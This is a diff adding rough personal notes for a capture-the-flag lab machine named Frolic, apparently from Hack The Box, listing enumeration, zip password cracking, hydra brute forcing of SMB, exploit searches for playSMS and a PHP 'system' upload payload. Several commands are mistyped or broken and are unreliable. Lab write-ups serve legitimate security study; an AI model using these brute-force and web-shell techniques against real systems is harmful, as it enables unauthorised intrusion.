@@ -1,0 +1,69 @@
+IP=10.10.10.111
+
+nmap - sC -sV -oA nmap/frolic $IP
+	ssh open on port 22
+	smb open to ports
+	message signing disabled
+	9999 open
+
+smbmap -H $IP
+
+http://$IP:9999
+	! forlic instead of frolic
+	! 1880 instead of 9999
+	
+nc -zv $IP
+
+http://$IP:1880
+	Node-RED instance
+> 2 different machines, 2 differents 
+	
+vi /etc/hosts
+	10.10.10.111	frolic.thb frolic forlic.thb forlic
+
+nmap -p- -oA nmap/allports 10.10.10.111
+# -p- stands for all ports
+
+gobuster -u http://10.10.10.111:9999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root.log
+	/admin
+	/test
+		allow_url_include
+		session_save_path
+	/dev
+	/backup
+	/loop
+	
+for i in admin test dev backup loop;
+	do gobuster -u http://SIP:9999/$i -w /usr/.../wordlists/de... -o gobuster-$i.log -t 50
+	done
+# -t threads
+	
+vi
+:s/ //g
+#replace space in vi
+
+base 64 -d random_page.b64 > random_page
+file random_page > random page.zip
+unzip random_page.zip
+
+zip2john random_page.zip > random_page.zip.hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt random_page.zip.hash
+john random_age.zip.hash --show
+
+cat index.php | xxd -r -p > index.php.b64
+base64 index.php.b64
+
+google decode code
+
+hydra -l admin -P password.txt smb://10.10.10.111
+
+searchploit playsms
+searchploit -x 
+
+vi file-upload
+	1,2,3
+vi file-upload
+	<?php system('whoami'); ?>
+
+###33:36
